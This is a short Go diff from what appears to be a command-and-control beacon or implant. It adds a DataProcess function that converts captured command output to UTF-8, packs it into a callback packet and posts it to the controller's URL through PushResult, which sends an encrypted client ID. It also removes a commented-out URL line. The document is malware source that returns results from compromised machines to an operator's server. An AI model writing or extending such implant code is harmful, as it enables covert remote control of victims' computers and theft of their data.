@@ -255,7 +255,6 @@ func PullCommand() ([]byte, error) {
 
 func PushResult(b []byte) ([]byte, error) {
 	id, _ := crypt.EncryptMultipleTypes([]byte(strconv.Itoa(clientID)), config.Http_post_id_crypt)
-	//url := config.PostUrl + string(id)
 	url := config.PostUrl
 	data, err := HttpPost(url, b, config.Http_post_server_output_crypt, id)
 	fmt.Println("pushresult success")
@@ -263,6 +262,22 @@ func PushResult(b []byte) ([]byte, error) {
 		return nil, err
 	}
 	return data, err
+}
+
+func DataProcess(callbackType int, b []byte) {
+	result := b
+	var err error
+	if callbackType == 0 {
+		result, err = CodepageToUTF8(b)
+		if err != nil {
+			ErrorProcess(err)
+		}
+	}
+	finalPaket := MakePacket(callbackType, result)
+	_, err = PushResult(finalPaket)
+	if err != nil {
+		ErrorProcess(err)
+	}
 }
 
 func ErrorProcess(err error) {
